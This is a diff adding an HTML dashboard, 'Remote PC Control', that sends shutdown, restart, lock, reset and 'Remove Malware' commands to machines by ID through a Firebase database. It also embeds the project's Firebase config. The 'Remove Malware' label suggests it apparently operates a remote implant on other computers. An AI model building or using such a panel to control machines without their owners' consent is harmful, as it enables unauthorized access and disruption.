@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Remote PC Control</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 100px;
+        }
+
+        button {
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            cursor: pointer;
+        }
+
+        #status {
+            margin-top: 20px;
+            font-size: 20px;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>Remote PC Control</h1>
+
+    <button id="shutdownBtn" onclick="sendCommand(1)">Shutdown (1)</button>
+    <button id="restartBtn" onclick="sendCommand(2)">Restart (2)</button>
+    <button id="lockBtn" onclick="sendCommand(3)">Lock (3)</button>
+    <button id="resetBtn" onclick="document.getElementById('run_once').checked = true; sendCommand(0)">Reset (0)</button>
+
+    <br><br>
+
+    <input type="checkbox" id="run_once" name="run_once" checked>
+    <label for="run_once">Run Once</label>
+
+    <input type="number" id="machine_id" name="machine_id" placeholder="Machine ID" style="margin-left: 20px;">
+
+    <p id="status">Getting Status...</p>
+
+    <button onclick="removeMalware()" style="background-color: #0d6efd;">Remove Malware (-1)</button>
+
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-auth-compat.js"></script>
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyCkM2xoQuVKbe_MI0tQ0xrfA99qLAIsT2c",
+            authDomain: "remote-pc-cont.firebaseapp.com",
+            databaseURL: "https://remote-pc-cont-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "remote-pc-cont",
+            storageBucket: "remote-pc-cont.firebasestorage.app",
+            messagingSenderId: "34117196151",
+            appId: "1:34117196151:web:08f56775d77b5ebe2fa972"
+        };
+        firebase.initializeApp(firebaseConfig);
+
+        firebase.database().ref("/control").on("value", (snapshot) => {
+            const status = snapshot.val();
+
+            let M_ID = status.M_ID;
+            let cmd = status.cmd;
+            let res = status.res;
+            let run_once = status.run_once;
+
+            document.getElementById("machine_id").value = M_ID;
+
+            if (cmd == 0){
+                document.getElementById("shutdownBtn").style.backgroundColor = "#6c757d";
+                document.getElementById("restartBtn").style.backgroundColor = "#6c757d";
+                document.getElementById("lockBtn").style.backgroundColor = "#6c757d";
+                document.getElementById("resetBtn").style.backgroundColor = "#dc3545";
+            }
+            else if (cmd == 1) {
+                document.getElementById("shutdownBtn").style.backgroundColor = "#dc3545";
+                document.getElementById("restartBtn").style.backgroundColor = "#6c757d";
+                document.getElementById("lockBtn").style.backgroundColor = "#6c757d";
+                document.getElementById("resetBtn").style.backgroundColor = "#6c757d";
+            }
+            else if (cmd == 2) {
+                document.getElementById("shutdownBtn").style.backgroundColor = "#6c757d";
+                document.getElementById("restartBtn").style.backgroundColor = "#dc3545";
+                document.getElementById("lockBtn").style.backgroundColor = "#6c757d";
+                document.getElementById("resetBtn").style.backgroundColor = "#6c757d";
+            }
+            else if (cmd == 3) {
+                document.getElementById("shutdownBtn").style.backgroundColor = "#6c757d";
+                document.getElementById("restartBtn").style.backgroundColor = "#6c757d";
+                document.getElementById("lockBtn").style.backgroundColor = "#dc3545";
+                document.getElementById("resetBtn").style.backgroundColor = "#6c757d";
+            }
+
+            let statusText = `M_ID: ${M_ID} \n
+                              Command: ${cmd} \n
+                              Response: ${res} \n
+                              Run Once: ${run_once}
+                             `;
+            document.getElementById("status").innerText = statusText;
+        });
+
+        function sendCommand(command) {
+            const runOnceCheckbox = document.getElementById("run_once").checked;
+            const machineId = parseInt(document.getElementById("machine_id").value);
+            firebase.database().ref("/control").update({
+                M_ID: machineId,
+                cmd: command,
+                run_once: runOnceCheckbox
+            });
+        }
+
+        function removeMalware() {
+            if (confirm("Are you sure you want to remove malware? This action cannot be undone.")) {
+                const machineId = parseInt(document.getElementById("machine_id").value);
+                firebase.database().ref("/control").update({
+                    M_ID: machineId,
+                    cmd: -1,
+                });
+            }
+        }
+    </script>
+</body>
+</html>
